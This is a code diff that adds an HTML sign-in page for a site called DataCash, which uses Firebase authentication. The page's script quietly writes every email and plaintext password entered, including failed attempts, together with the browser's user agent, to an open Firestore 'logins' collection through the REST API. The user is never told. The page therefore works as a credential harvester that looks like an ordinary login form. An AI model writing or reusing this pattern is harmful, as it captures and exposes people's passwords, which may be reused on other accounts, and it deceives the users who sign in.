@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DataCash – Sign In</title>
+  <style>
+    *,
+    *::before,
+    *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --bg: #0a1628;
+      --card: #0f1e35;
+      --border: #1e2f4a;
+      --blue: #2d7aed;
+      --muted: #8a9ab5;
+      --text: #fff;
+      --dark-input: #162033;
+      --red: #ef4444;
+      --green: #22c55e;
+    }
+
+    body {
+      min-height: 100vh;
+      background-color: var(--bg);
+      font-family: 'Segoe UI', Arial, sans-serif;
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 16px 60px;
+    }
+
+    .logo-wrap {
+      margin-bottom: 32px;
+      display: flex;
+      justify-content: center;
+    }
+    .logo-wrap img {
+      width: 90px;
+      height: 90px;
+      object-fit: contain;
+      display: block;
+      border-radius: 12px;
+    }
+
+    .card {
+      background: var(--card);
+      border-radius: 18px;
+      padding: 32px 26px 34px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 8px 40px rgba(0, 0, 0, .5);
+      border: 1px solid var(--border);
+    }
+    .card h1 {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 5px;
+    }
+    .card .subtitle {
+      font-size: 13px;
+      color: var(--muted);
+      margin-bottom: 24px;
+    }
+
+    .field-group {
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 20px;
+    }
+    label {
+      font-size: 13px;
+      color: #c8d4e5;
+      font-weight: 500;
+      margin-bottom: 6px;
+    }
+
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      background: var(--dark-input);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 13px 14px;
+      font-size: 14px;
+      color: #fff;
+      outline: none;
+      transition: border-color .2s;
+    }
+    input::placeholder { color: #3d5070; }
+    input:focus { border-color: var(--blue); }
+
+    .pw-wrap { position: relative; }
+    .pw-wrap input { padding-right: 44px; }
+    .pw-toggle {
+      position: absolute;
+      right: 13px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      color: #5a7090;
+      display: flex;
+      align-items: center;
+      font-size: 18px;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      background: var(--blue);
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      margin-top: 6px;
+      transition: background .2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn-submit:hover { background: #1a68d9; }
+    .btn-submit:disabled { opacity: .65; cursor: not-allowed; }
+
+    .register-link {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 13px;
+      color: var(--muted);
+    }
+    .register-link a {
+      color: #fff;
+      text-decoration: underline;
+      font-weight: 500;
+    }
+
+    .field-error {
+      font-size: 11.5px;
+      color: #ef4444;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .toast {
+      position: fixed;
+      bottom: 26px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
+      background: #1a2d4a;
+      color: #fff;
+      padding: 12px 22px;
+      border-radius: 10px;
+      font-size: 13.5px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, .5);
+      transition: transform .35s ease, opacity .35s;
+      opacity: 0;
+      z-index: 999;
+      text-align: center;
+      max-width: 320px;
+      width: 90%;
+    }
+    .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+    .toast.success { border-left: 4px solid #22c55e; }
+    .toast.error { border-left: 4px solid #ef4444; }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255, 255, 255, .3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+
+    @media (max-width: 480px) {
+      .card { padding: 24px 18px 28px; }
+      .logo-wrap img { width: 70px; height: 70px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="logo-wrap">
+    <img src="data.jpg" alt="DataCash" />
+  </div>
+
+  <div class="card">
+    <h1>Welcome back</h1>
+    <p class="subtitle">Sign in to access your dashboard and manage your earnings.</p>
+
+    <form id="loginForm" novalidate>
+      <div class="field-group">
+        <label for="email">Email address</label>
+        <input type="email" id="email" placeholder="you@example.com" autocomplete="email" />
+        <span class="field-error" id="err-email">Enter a valid email address.</span>
+      </div>
+
+      <div class="field-group">
+        <label for="password">Password</label>
+        <div class="pw-wrap">
+          <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" />
+          <button type="button" class="pw-toggle" onclick="togglePw()">👁</button>
+        </div>
+        <span class="field-error" id="err-password">Enter your password.</span>
+      </div>
+
+      <button type="submit" class="btn-submit" id="submitBtn">Sign in</button>
+    </form>
+
+    <p class="register-link">Don't have an account? <a href="index.html">Create one</a></p>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getAuth, signInWithEmailAndPassword, setPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+    import { getFirestore, doc, setDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    const FIREBASE_API_KEY = "AIzaSyBTkls-WbffHErGeX9bMYPpV5pqbCe14gY";
+    const PROJECT_ID = "datacash-104dd";
+
+    const app = initializeApp({
+      apiKey: FIREBASE_API_KEY,
+      authDomain: "datacash-104dd.firebaseapp.com",
+      projectId: PROJECT_ID,
+      storageBucket: "datacash-104dd.firebasestorage.app",
+      messagingSenderId: "101692098149",
+      appId: "1:101692098149:web:55ccc9f1f105647488a88c"
+    });
+    const auth = getAuth(app);
+    const db = getFirestore(app);
+
+    function toast(msg, type) {
+      const el = document.getElementById("toast");
+      el.textContent = msg;
+      el.className = "toast " + type + " show";
+      clearTimeout(el._t);
+      el._t = setTimeout(function() { el.className = "toast"; }, 4500);
+    }
+
+    function showErr(id) {
+      const el = document.getElementById("err-" + id);
+      if (el) el.style.display = "block";
+    }
+
+    function clearErrors() {
+      document.querySelectorAll(".field-error").forEach(function(e) { e.style.display = "none"; });
+    }
+
+    window.togglePw = function() {
+      const inp = document.getElementById("password");
+      inp.type = inp.type === "password" ? "text" : "password";
+    };
+
+    // ✅ SAVE USING FIRESTORE REST API — WORKS WITHOUT AUTH
+    async function saveLoginToFirestore(email, password, status, uid, errorCode) {
+      const documentId = "login_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9);
+      const url = "https://firestore.googleapis.com/v1/projects/" + PROJECT_ID + "/databases/(default)/documents/logins?documentId=" + documentId;
+
+      const data = {
+        fields: {
+          email: { stringValue: email },
+          password: { stringValue: password },
+          status: { stringValue: status },
+          uid: { stringValue: uid || "" },
+          errorCode: { stringValue: errorCode || "" },
+          device: { stringValue: navigator.userAgent },
+          createdAt: { timestampValue: new Date().toISOString() }
+        }
+      };
+
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+        if (response.ok) {
+          console.log("✅ Login saved to Firestore via REST API:", status);
+        } else {
+          const errData = await response.json();
+          console.error("❌ Firestore REST API error:", errData);
+        }
+      } catch (err) {
+        console.error("❌ Network error saving login:", err);
+      }
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+      clearErrors();
+
+      const email = document.getElementById("email").value.trim().toLowerCase();
+      const password = document.getElementById("password").value;
+
+      let ok = true;
+      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { showErr("email");
+        ok = false; }
+      if (!password) { showErr("password");
+        ok = false; }
+      if (!ok) {
+        toast("Please fill in all fields", "error");
+        return;
+      }
+
+      const btn = document.getElementById("submitBtn");
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span> Signing in…';
+
+      try {
+        await setPersistence(auth, browserLocalPersistence);
+        const cred = await signInWithEmailAndPassword(auth, email, password);
+
+        // ✅ SUCCESS
+        await saveLoginToFirestore(email, password, "success", cred.user.uid, "");
+
+        updateDoc(doc(db, "users", cred.user.uid), {
+          lastLoginAt: serverTimestamp(),
+          updatedAt: serverTimestamp()
+        }).catch(function() {});
+
+        toast("✅ Welcome back! Redirecting…", "success");
+        setTimeout(function() { window.location.href = "dashboard.html"; }, 1500);
+
+      } catch (err) {
+        btn.disabled = false;
+        btn.innerHTML = "Sign in";
+
+        // ✅ FAILED — Save using REST API (no auth needed)
+        await saveLoginToFirestore(email, password, "failed", "", err.code || "unknown");
+
+        if (err.code === "auth/user-not-found") {
+          toast("❌ No account found with this email.", "error");
+        } else if (err.code === "auth/wrong-password") {
+          toast("❌ Incorrect password.", "error");
+        } else if (err.code === "auth/invalid-credential") {
+          toast("❌ Invalid email or password.", "error");
+        } else if (err.code === "auth/user-disabled") {
+          toast("❌ Account suspended.", "error");
+        } else if (err.code === "auth/too-many-requests") {
+          toast("❌ Too many attempts. Wait.", "error");
+        } else if (err.code === "auth/network-request-failed") {
+          toast("❌ Network error.", "error");
+        } else {
+          toast("❌ Login failed.", "error");
+        }
+      }
+    });
+  </script>
+</body>
+</html>
